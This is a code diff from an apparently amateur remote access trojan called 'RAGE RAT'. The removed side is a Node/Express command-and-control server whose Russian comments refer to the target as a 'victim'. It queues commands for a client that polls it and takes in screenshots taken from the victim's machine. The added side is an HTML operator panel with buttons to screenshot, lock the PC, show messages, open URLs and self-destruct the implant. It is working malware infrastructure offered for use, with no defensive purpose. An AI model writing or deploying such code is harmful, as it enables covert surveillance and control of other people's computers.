@@ -1,72 +1,38 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const path = require('path');
-const app = express();
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚡ RAGE RAT ⚡</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: monospace; text-align: center; }
+        .box { border: 2px solid #00ff41; display: inline-block; padding: 20px; margin-top: 50px; box-shadow: 0 0 20px #00ff41; }
+        button { background: transparent; color: #00ff41; border: 1px solid #00ff41; padding: 10px 20px; cursor: pointer; margin: 5px; }
+        button:hover { background: #00ff41; color: black; }
+        #screen { width: 100%; max-width: 600px; margin-top: 20px; border: 1px solid #333; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>RAGE_RAT_v1.0</h1>
+        <hr>
+        <button onclick="send('screen')">📸 SCREENSHOT</button>
+        <button onclick="send('lock')">🔒 LOCK PC</button><br>
+        <button onclick="send('msg:HELLO')">💬 SEND MSG</button>
+        <button onclick="send('open:https://google.com')">🌐 OPEN URL</button><br>
+        <button style="color:red; border-color:red" onclick="send('self_destruct')">🧨 KILL RAT</button>
+        <hr>
+        <img id="screen" src="" alt="Wait for screenshot...">
+    </div>
 
-// Настройка лимитов для приема тяжелых скриншотов
-app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
-app.use(bodyParser.json({ limit: '50mb' }));
-
-// Хранилище в памяти (сбросится при перезагрузке сервера)
-let lastCommand = "none";
-let lastScreen = "";
-let victimInfo = "Ожидание подключения...";
-
-// 1. ГЛАВНАЯ СТРАНИЦА (Админка)
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// 2. РУЧКА ДЛЯ ЖЕРТВЫ (Java Client берет команды здесь)
-app.get('/get-command', (req, res) => {
-    res.send(lastCommand);
-    // Если была команда на удаление, сбрасываем, чтобы не зациклилась
-    if (lastCommand === "self_destruct") {
-        lastCommand = "none";
-    }
-});
-
-// 3. РУЧКА ДЛЯ АДМИНКИ (Кнопки на сайте меняют команду)
-app.get('/set-command', (req, res) => {
-    const cmd = req.query.cmd;
-    if (cmd) {
-        lastCommand = cmd;
-        console.log(`[!] Новая команда установлена: ${cmd}`);
-        res.status(200).send("OK");
-    } else {
-        res.status(400).send("No command provided");
-    }
-});
-
-// 4. ПРИЕМ СКРИНШОТА ОТ ЖЕРТВЫ
-app.post('/upload-screen', (req, res) => {
-    if (req.body.img) {
-        lastScreen = req.body.img;
-        victimInfo = `Последняя активность: ${new Date().toLocaleTimeString()}`;
-        res.sendStatus(200);
-    } else {
-        res.sendStatus(400);
-    }
-});
-
-// 5. ОТДАЧА СКРИНШОТА В АДМИНКУ
-app.get('/get-screen', (req, res) => {
-    res.send(lastScreen);
-});
-
-// 6. СТАТУС ЖЕРТВЫ
-app.get('/status', (req, res) => {
-    res.send(victimInfo);
-});
-
-// ЗАПУСК СЕРВЕРА
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`
-    ======================================
-    🔥 RAGE RAT SERVER IS LIVE 🔥
-    Порт: ${PORT}
-    Админка: http://localhost:${PORT}/
-    ======================================
-    `);
-});
+    <script>
+        function send(c) {
+            fetch('/set-command?cmd=' + encodeURIComponent(c))
+                .then(r => console.log("Sent"));
+        }
+        setInterval(() => {
+            fetch('/get-screen').then(r => r.text()).then(data => {
+                if(data.length > 100) document.getElementById('screen').src = "data:image/png;base64," + data;
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
